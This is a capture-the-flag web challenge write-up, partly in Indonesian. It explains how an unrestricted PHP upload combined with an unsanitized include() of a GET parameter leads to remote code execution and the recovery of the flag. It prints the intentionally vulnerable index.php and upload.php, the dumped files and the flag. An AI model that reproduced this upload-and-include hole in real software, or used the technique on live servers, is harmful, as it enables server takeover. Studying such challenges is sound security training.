```
- View Source  
<!-- get the 'page' :eyes: --> (index.php bakal nerima $_GET['page'])

- http://web.zh3r0.ml:7777/robots.txt 
DUMB: this is not a good place the flag is the flag :P 

- Cek http://web.zh3r0.ml:7777/index.php?page=flag -> View Source 
<!-- https://www.youtube.com/watch?v=0ZfZj2bn_xg --> (Youtube berjudul Upload)

- Cek http://web.zh3r0.ml:7777/index.php?page=upload -> Bisa upload php -> Eksekusi system('ls') -> payload masuk, uploadan kita bakalan ada di http://web.zh3r0.ml:7777/index.php?page=NAMAUPLOADANKITA (tanpa .php)

- Masukin payload buat cat semua file di semua direktori -> dapet flag, cek di bawah -> **zh3r0{h3y_d1d_y0u_upl04d_php_c0rr3ct1y???_84651320}**
```

```
ls -la:

total 220
drwxr-xr-x    1 nginx    nginx         4096 Jun 15 14:36 .
drwxr-xr-x    1 root     root          4096 Apr 20 15:04 ..
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 987l,oi67mn5rbheysxtys4
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 ;sdojhghisoojjtml;'Zd
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 ;ylfdtkjhgrxymrndgb
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 aw,64mtzsdbrfgxmnjhbf
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 d,rtnfhbgdtyjkxdhg
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 dymnjxtgsdhxfhdhfg
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 e.,58mjnu6jtrhujdf.,lkndhbgd5veytdr
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 eslrkmtdnhgserkjhg
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 fdhgsjhahaehhfdagrash
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 gsuidhlibudbwlonmgitssgdfbh
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 gxdsfrhgvghjghryftyjhr
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 hnrdtskhginbdhmkrmoyhbemgtr
-rw-r--r--    1 nginx    nginx          260 May 26 14:47 index.php
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 mzsanbvcmzrsetbv
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 ogiuthervsoilmnyjk,btuimjntebu
-rw-r--r--    1 nginx    nginx         1490 May 26 20:19 progress.php
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 rdfxcvghbjnkml,;.kfjdtuhrsgt
-rw-r--r--    1 nginx    nginx           55 Jun 15 14:34 robots.txt
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 se.,5m7nrybhdflkjhsbgrttds
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 se4juhdgfrekjhg
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 sfjutsyjkneatghdjhgrsh
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 soyertidhbvghbrhjnjkheg
drwxr-xr-x    1 nginx    nginx         4096 Jun 17 05:56 sshsfgsbdf
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 st';ojpnbvm,ijnvkwoegf[mlyhj
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 t798,kirnmmy5h
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 ymskmjhgzkmjzbxs
drwxr-xr-x    1 nginx    nginx         4096 Jun  5 13:13 yugdbshvdsdgjuhsdzgerztrd
```

```
Index.php:

<pre><?php
    error_reporting(0);
    $file = isset($_GET['page']) ? $_GET['page'] : NULL;
    if(isset($file))
    {
        $loc ="./sshsfgsbdf/$file.php";
        include($loc);
    }
    else
    {
        include("./sshsfgsbdf/home.php");
    }
?>
```

```
Upload.php:

$target_dir = "sshsfgsbdf/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
/*
// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
  if($check !== false) {
    echo "File is an image - " . $check["mime"] . ".";
    $uploadOk = 1;
  } else {
    echo "File is not an image.";
    $uploadOk = 0;
  }
}
*/
// Check if file already exists
if (file_exists($target_file)) {
  echo "Sorry, file already exists.";
  $uploadOk = 0;
}

// Check file size
if ($_FILES["fileToUpload"]["size"] > 500000) {
  echo "Sorry, your file is too large.";
  $uploadOk = 0;
}

// Allow certain file formats
/*
if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
&& $imageFileType != "gif" ) {
  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
  $uploadOk = 0;
}
*/
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
  echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
  if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
  } else {
    echo "Sorry, there was an error uploading your file.";
  }
}
```

```
<pre><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?>
<br>
<a href="./">continue</a>DUMB: this is not a good place the flag is the flag :P
<?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?>?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="zh3r0{h3y_d1d_y0u_upl04d_php_c0rr3ct1y???_84651320}";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?><?php
    $flag="<b><font size=26>Not that easy :P</font></b><br><img src='https://media.giphy.com/media/p0RDMJGgMXF96/giphy.gif' />";
?>
```
